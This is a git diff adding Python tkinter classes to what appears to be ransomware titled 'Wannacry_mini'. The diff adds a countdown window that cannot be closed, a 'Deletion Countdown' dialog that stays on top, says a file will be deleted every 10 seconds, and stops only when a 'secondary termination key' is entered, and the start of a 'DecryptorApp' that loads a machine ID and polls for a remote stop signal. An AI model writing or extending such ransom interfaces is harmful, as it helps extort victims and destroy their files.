@@ -234,3 +234,123 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         position_down = int(screen_height/2 - window_height/2)
         self.geometry(f"+{position_right}+{position_down}")
 
+class CountdownDIalog(tk.Toplevel):
+    def __init__(self, parent, countdown_time, close_app_callback):
+        super().__init__(parent)
+        self.countdown_time = countdown_time
+        self.close_app_callback = close_app_callback
+        self.init_ui()
+        self.protocol("WM_DELETE_WINDOW", self.disable_event)
+        self.resizable(False, False)
+        self.attributes('-topmost', True)
+        self.overrideredirect(True)
+        self.grab_set()
+        self.center_window()
+
+    def disable_event(self):
+        pass
+
+    def init_ui(self):
+        self.geometry("350x150")
+        self.iconphoto(False, tk.PhotoImage(file=ICON_PATH))
+        thanks_image = Image.open(THANKYOU_PATH).resize((50,50))
+        thanks_photo = ImageTk.PhotoImage(thanks_image)
+        label = tk.Label(self, image=thanks_photo, bg='#f0f0f0')
+        label.image = thanks_photo
+        label.pack(side="left", padx=10, pady=20)
+        self.countdown_label = tk.Label(self, text=f"Application will close in {self.countdown_time} seconds.", bg='#f0f0f0')
+        self.countdown_label.pack(side="left", expand=True, padx=20, pady=20)
+        self.update_countdown()
+
+    def update_countdown(self):
+        if self.countdown_time > 0:
+            self.countdown_label.config(text=f"Application will close in {self.countdown_time} seconds.")
+            self.countdown_time -= 1
+            self.after(1000, self.update_countdown)
+        else:
+            self.countdown_label.config(text="Closing application now.")
+            self.close_app_callback()
+
+    def center_window(self):
+        self.update_idletasks()
+        window_width = self.winfo_width()
+        window_height = self.winfo_height()
+        screen_width = self.winfo_screenwidth()
+        screen_height = self.winfo_screenheight()
+        position_right = int(screen_width/2 - window_width/2)
+        position_down = int(screen_height/2 - window_height/2)
+        self.geometry(f"+{position_right}+{position_down}")
+
+class DeleteCountdownDialog(tk.Toplevel):
+    def __init__(self, parent, stop_deletion_callback):
+        super().__init__(parent)
+        self.iconphoto(False, tk.PhotoImage(file=ICON_PATH))
+        self.stop_deletion_callback = stop_deletion_callback
+        self.attributes('-topmost', True)
+        self.title("Deletion Countdown")
+        self.resizable(False, False)
+
+        window_width = 400
+        window_height = 200
+        screen_width = self.winfo_screenwidth()
+        screen_height = self.winfo_screenheight()
+        position_right = int(screen_width/2 - window_width/2)
+        position_down = int(screen_height/2 - window_height/2)
+
+        self.geometry(f"{window_width}x{window_height}+{position_right}+{position_down}")
+
+        self.protocol("WM_DELETE_WINDOW", self.on_try_close)
+        self.grab_set()
+        self.focus_force()
+        self.init_ui()
+    
+    def init_ui(self):
+        thanks_image = Image.open(THANKYOU_PATH).resize((80,80))
+        thanks_photo = ImageTk.PhotoImage(thanks_image)
+        label_image = tk.Label(self, image=thanks_photo)
+        label_image.photo = thanks_photo
+        label_image.pack(pady=20)
+
+        self.label_countdown = tk.Label(self, text="Next file will be deleted in Every 10 seconds...", font=("Helvetica", 12))
+        self.label_countdown.pack()
+
+        button_stop = tk.Button(self, text="Enter Key", command=self.on_enter_key,
+                                font=('Helvetica', 10),
+                                relief=tk.FLAT)
+        button_stop.pack(pady=10, padx=10, ipadx=20, ipady=5)
+
+    def on_try_close(self):
+        messagebox.showwarning("Warning", "This window cannot be closed directly.")
+    
+    def on_enter_key(self):
+        self.iconphoto(False, tk.PhotoImage(file=ICON_PATH))
+        key = CustomSecondaryTerminationKeyDialog(self, ICON_PATH, "Stop Deletion", "Enter the secondary termination key:").result
+        if key == SECONDARY_TERMINATION_KEY:
+            self.stop_deletion_callback()
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect secondary termination key.")
+
+class DecryptorApp(tk.Tk):
+    def __init__(self):
+        super().__init__()
+        self.iconphoto(False, tk.PhotoImage(file=ICON_PATH))
+        self.title("Wannacry_mini")
+        self.configure(bg='black')
+        self.geometry("900x800")
+        self.timer_update_id = None
+        self.stop_deletion = False
+        self.deletion_stopped = False
+        self.initialize_ui()
+        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
+        self.stop_event = threading.Event()
+
+        self.machine_id = load_machine_id()
+        if self.machine_id:
+            self.load_timer_state()
+        else:
+            messagebox.showerror("Error", "No Machine ID found. The application will exit.")
+            self.destroy()
+        
+        threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id,), daemon=True).start()
+        
